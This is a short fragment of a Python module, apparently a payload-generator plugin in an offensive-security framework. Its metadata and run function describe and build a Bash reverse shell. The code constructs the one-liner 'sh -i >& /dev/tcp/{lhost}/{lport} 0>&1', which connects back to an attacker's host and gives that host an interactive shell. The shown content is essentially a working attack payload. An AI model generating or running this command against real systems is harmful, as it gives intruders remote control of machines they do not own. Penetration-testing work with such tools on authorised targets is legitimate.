...
metadata = {
    ...
    "description": "A Bash-based reverse shell that uses /dev/tcp to execute commands remotely and redirect output.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
...
def run(args):
    ...
    # Generate the Bash TCP reverse shell command
    tcp_shell_command = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
